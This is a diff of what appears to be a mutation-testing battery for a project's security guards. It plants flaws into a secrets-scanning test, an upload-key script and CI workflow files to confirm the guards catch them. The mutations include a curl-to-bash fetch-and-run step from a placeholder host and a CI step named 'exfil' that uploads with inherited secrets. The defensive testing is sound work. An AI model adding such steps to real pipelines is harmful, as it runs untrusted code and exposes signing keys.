@@ -383,13 +383,25 @@ MUTATIONS: list[Mutation] = [
              sub(r'echo "gcloud \\\$\*" >> "\$\{_tmp\.path\}/gcloud\.log"\n', "", 1),
              "the channel that catches a key on a command line goes quiet",
              'argv'),
-    Mutation("#220", "the harmless exemption widens to a three-line window",
+    # Two edits, because removing a protection proves nothing unless the thing
+    # it protects against is present. Nothing in the file has the laundering
+    # shape today, so the widened window alone changed no verdict and the
+    # entry SURVIVED -- the battery reporting, correctly, that it tested
+    # nothing (#230).
+    Mutation("#220", "the harmless exemption widens, and a call hides behind it",
              "test/guards/secrets_scripts_test.dart",
-             sub(r"      if \(harmless\.hasMatch\(lines\[i\]\)\) continue;",
-                 "      if (harmless.hasMatch(\n"
-                 "        lines.sublist(i, (i + 3).clamp(0, lines.length)).join(' '),\n"
-                 "      )) {\n        continue;\n      }", 1),
-             "a raw call with a chmod two lines away was laundered by the window",
+             chain(
+                 sub(r"      if \(harmless\.hasMatch\(lines\[i\]\)\) continue;",
+                     "      if (harmless.hasMatch(\n"
+                     "        lines.sublist(i, (i + 3).clamp(0, lines.length)).join(' '),\n"
+                     "      )) {\n        continue;\n      }", 1),
+                 sub(r"(\nvoid main\(\) \{)",
+                     r'\nvoid _launder() {\n'
+                     r'  Process.runSync("/bin/sh", ["-c", "echo hi"]);\n'
+                     r'  Process.runSync("chmod", ["+x", "/tmp/x"]);\n'
+                     r'}\1', 1),
+             ),
+             "a raw call with a chmod two lines away is laundered by the window",
              'leak-chokepoint'),
     Mutation("#230", "make_upload_key stops enforcing a minimum password length",
              "tools/make_upload_key.sh",
@@ -616,13 +628,13 @@ MUTATIONS: list[Mutation] = [
              'still pending'),
     # ---- #182: the upload rule applied to every file, and step sets -------
     Mutation("#182", "a Play upload added to ci.yml", ".github/workflows/ci.yml",
-             sub(r"(      - id: gate\n        name: Quality gate\n        run: tools/gate\.sh\n)",
+             sub(r"(        run: tools/gate\.sh\n)",
                  r"\1\n      - id: exfil\n        uses: r0adkll/upload-google-play@v1\n"
                  "        with:\n          serviceAccountJsonPlainText: x\n          track: production\n"),
              "ci.yml is workflow_called with secrets: inherit, so this uploads with the real key on a tag",
              'upload-scope:'),
     Mutation("#182", "an extra step in the ci gate job", ".github/workflows/ci.yml",
-             sub(r"(      - id: gate\n        name: Quality gate\n        run: tools/gate\.sh\n)",
+             sub(r"(        run: tools/gate\.sh\n)",
                  r"\1\n      - id: extra\n        run: curl -sSL https://example.test/x | bash\n"),
              "an added step in the gate job runs with whatever secrets the caller inherited",
              'ci-shape: exactly these steps'),
